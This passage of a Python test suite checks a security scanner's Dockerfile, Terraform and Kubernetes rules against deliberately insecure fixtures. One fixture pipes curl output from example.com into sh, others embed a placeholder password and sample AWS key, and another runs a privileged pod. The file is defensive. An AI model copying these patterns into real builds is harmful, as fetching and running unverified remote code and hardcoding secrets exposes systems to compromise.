        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        assert _rule_ids(findings) == [
            "DOCKER_LATEST_TAG",
            "DOCKER_UNPINNED_BASE_IMAGE",
        ]
        by_rule = {f["rule_id"]: f for f in findings}
        assert by_rule["DOCKER_LATEST_TAG"]["line"] == 1
        assert by_rule["DOCKER_UNPINNED_BASE_IMAGE"]["line"] == 2

    def test_from_as_stage_and_variable_are_honest(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine AS build\n"
            "FROM ${BASE_IMAGE}\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        # the named stage is still an untagged image; the variable
        # reference is opaque and claims nothing.
        assert _rule_ids(findings) == ["DOCKER_UNPINNED_BASE_IMAGE"]
        assert findings[0]["line"] == 1

    def test_stage_alias_ref_is_not_an_unpinned_image(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM python:3.11-slim-buster as prod\n"
            "FROM prod as dev\n"
            "FROM alpine\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        # "prod" resolves to the earlier stage (AgentGPT platform:35 shape);
        # only the genuinely untagged image on line 3 is a finding.
        assert _rule_ids(findings) == ["DOCKER_UNPINNED_BASE_IMAGE"]
        assert findings[0]["line"] == 3

    def test_multistage_alias_chain_stays_quiet(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM mcr.microsoft.com/dotnet/runtime:7.0 AS base\n"
            "FROM mcr.microsoft.com/dotnet/sdk:7.0 AS build\n"
            "FROM build AS publish\n"
            "FROM base AS final\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        # autogen seed-memory/AgentHost shape: every alias target is a
        # pinned earlier stage, so pinning is N/A on lines 3 and 4.
        assert _rule_ids(findings) == []

    def test_alias_only_counts_when_declared_earlier(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM shared\n"
            "FROM alpine:3.19 AS shared\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        # before its declaration a name is just an untagged image ref
        assert _rule_ids(findings) == ["DOCKER_UNPINNED_BASE_IMAGE"]
        assert findings[0]["line"] == 1

    def test_fallback_engine_skips_stage_alias_refs(self, tmp_path, monkeypatch):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19 AS build\n"
            "FROM build\n"
            "USER app\n", encoding="utf-8")
        monkeypatch.setattr("scanner.iac_docker.parse_dockerfile", lambda _s: None)
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        # forced line-regex fallback must carry the same stage semantics
        assert _rule_ids(findings) == []

    def test_user_root_vs_named_user(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19\n"
            "USER root\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        assert sorted(_rule_ids(findings)) == [
            "DOCKER_MISSING_USER",
            "DOCKER_RUNS_AS_ROOT",
        ]
        by_rule = {f["rule_id"]: f for f in findings}
        assert by_rule["DOCKER_RUNS_AS_ROOT"]["line"] == 2
        assert by_rule["DOCKER_MISSING_USER"]["line"] == 1  # FROM anchor

    def test_non_root_user_satisfies_both_user_rules(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19\n"
            "USER 1000\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        assert [f for f in findings if "USER" in f["rule_id"] or
                f["rule_id"] == "DOCKER_MISSING_USER"] == []

    def test_env_and_arg_secret_detection(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19\n"
            "ENV DB_PASSWORD=hunter2\n"
            "ARG API_TOKEN\n"
            "ARG BUILD_NUMBER\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        assert sorted(_rule_ids(findings)) == [
            "DOCKER_SECRETS_IN_ARG",
            "DOCKER_SECRETS_IN_ENV",
        ]

    def test_aws_key_in_comment_vs_run(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19\n"
            "# example: AKIAIOSFODNN7EXAMPLE\n"
            "RUN export AWS=AKIAIOSFODNN7EXAMPLE\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        hits = [f for f in findings if f["rule_id"] == "DOCKER_AWS_KEY"]
        assert len(hits) == 1
        assert hits[0]["line"] == 3

    def test_expose_sensitive_ports_and_ranges(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine:3.19\n"
            "EXPOSE 22\n"
            "EXPOSE 8080\n"
            "EXPOSE 6000-6010\n"
            "EXPOSE 6379/tcp\n"
            "USER app\n", encoding="utf-8")
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        hits = [f for f in findings if f["rule_id"] == "DOCKER_EXPOSE_SENSITIVE_PORT"]
        assert sorted(h["line"] for h in hits) == [2, 5]

    def test_kitchen_sink_covers_every_docker_rule(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM node:latest\n"
            "FROM alpine\n"
            "MAINTAINER Dev Team <dev@example.com>\n"
            "ADD https://example.com/y.tar /y\n"
            "ADD requirements.txt /app/requirements.txt\n"
            "ARG API_TOKEN=abc\n"
            "ENV DB_PASSWORD=x\n"
            "RUN apt-get update && apt-get install -y openssh-server sudo \\\n"
            "    && chmod 777 /app \\\n"
            "    && apt-get upgrade -y \\\n"
            "    && curl http://example.com/x | sh \\\n"
            "    && echo AKIAIOSFODNN7EXAMPLE\n"
            "USER root\n"
            "EXPOSE 22\n"
            "CMD [\"node\", \"app.js\"]\n", encoding="utf-8")
        from scanner.iac_docker import RULES
        findings = _findings_for(scan_docker, tmp_path, "Dockerfile")
        assert set(_rule_ids(findings)) == {r["rule_id"] for r in RULES}

    def test_comment_only_file_parses_empty(self):
        instructions = parse_dockerfile("# nothing here\n\n# still nothing\n")
        assert instructions == []

    # -- corpus parity ------------------------------------------------------

    def test_corpus_curl_pipe_shell(self):
        findings = _findings_for(
            scan_docker, CORPUS / "docker", "curl_pipe_shell.Dockerfile")
        assert [(f["rule_id"], f["line"]) for f in findings] == [
            ("DOCKER_CURL_PIPE_SHELL", 3),
            ("DOCKER_MISSING_HEALTHCHECK", 1)]

    def test_corpus_latest_tag(self):
        findings = _findings_for(
            scan_docker, CORPUS / "docker", "latest_tag.Dockerfile")
        assert [(f["rule_id"], f["line"]) for f in findings] == [
            ("DOCKER_LATEST_TAG", 1),
            ("DOCKER_MISSING_HEALTHCHECK", 1)]

    def test_corpus_root_user(self):
        findings = _findings_for(
            scan_docker, CORPUS / "docker", "root_user.Dockerfile")
        assert sorted((f["rule_id"], f["line"]) for f in findings) == [
            ("DOCKER_MISSING_HEALTHCHECK", 1),
            ("DOCKER_MISSING_USER", 1),
            ("DOCKER_RUNS_AS_ROOT", 5),
        ]


# ---------------------------------------------------------------------------
# Cross-cutting contracts
# ---------------------------------------------------------------------------

class TestContracts:
    def test_workload_kinds_single_source(self):
        from scanner import iac_kubernetes
        assert iac_kubernetes.WORKLOAD_KINDS is WORKLOAD_KINDS

    def test_structured_findings_carry_resource_path(self, tmp_path):
        (tmp_path / "sg.tf").write_text(
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec:\n"
            "  hostNetwork: true\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx:latest\n", encoding="utf-8")
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine\n", encoding="utf-8")
        for scanner, name in ((scan_terraform, "sg.tf"),
                              (scan_kubernetes, "pod.yaml"),
                              (scan_docker, "Dockerfile")):
            for finding in _findings_for(scanner, tmp_path, name):
                assert isinstance(finding["resource_path"], str)
                assert finding["resource_path"]

    def test_determinism_across_runs(self, tmp_path):
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec:\n"
            "  hostNetwork: true\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx:latest\n"
            "      securityContext:\n"
            "        privileged: true\n", encoding="utf-8")
        first = scan_kubernetes(str(tmp_path))
        second = scan_kubernetes(str(tmp_path))
        assert first == second

    def test_findings_are_json_serialisable(self, tmp_path):
        (tmp_path / "sg.tf").write_text(
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        json.dumps(_findings_for(scan_terraform, tmp_path, "sg.tf"))

    def test_structured_finding_shape_matches_regex_finding(self, tmp_path):
        """The structured path reuses the exact finding envelope; only the
        evidence key is new."""
        (tmp_path / "sg.tf").write_text(
            'resource "aws_security_group" "web" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n', encoding="utf-8")
        finding = _findings_for(scan_terraform, tmp_path, "sg.tf")[0]
        for key in ("title", "rule_id", "severity", "file", "line",
                    "snippet", "description", "remediation", "cwe",
                    "detection", "occurrences", "resource_path"):
            assert key in finding

    def test_evaluators_dedupe_per_unit(self):
        source = (
            'resource "aws_security_group" "sg" {\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '  ingress {\n'
            '    cidr_blocks = ["0.0.0.0/0"]\n'
            '  }\n'
            '}\n'
        )
        parsed = parse_hcl2(source)
        matches = evaluate_terraform_rules(
            [{"rule_id": "TF_OPEN_SECURITY_GROUP_INGRESS"}],
            source, parsed.blocks)
        assert len(matches) == 1

    def test_docker_instruction_ordinals_are_per_op(self):
        instructions = parse_dockerfile(
            "FROM alpine:3.19\nFROM node:20\nUSER app\nUSER root\n")
        assert [ins.op for ins in instructions] == [
            "FROM", "FROM", "USER", "USER"]
        matches = evaluate_docker_rules(
            [{"rule_id": "DOCKER_RUNS_AS_ROOT"}], instructions,
            "FROM alpine:3.19\nFROM node:20\nUSER app\nUSER root\n")
        assert matches[0]["resource_path"] == "dockerfile.user[2]"

    def test_docker_instruction_dataclass_fields(self):
        instructions = parse_dockerfile("EXPOSE 8080\n")
        ins = instructions[0]
        assert isinstance(ins, DockerInstruction)
        assert (ins.op, ins.args, ins.line) == ("EXPOSE", "8080", 1)
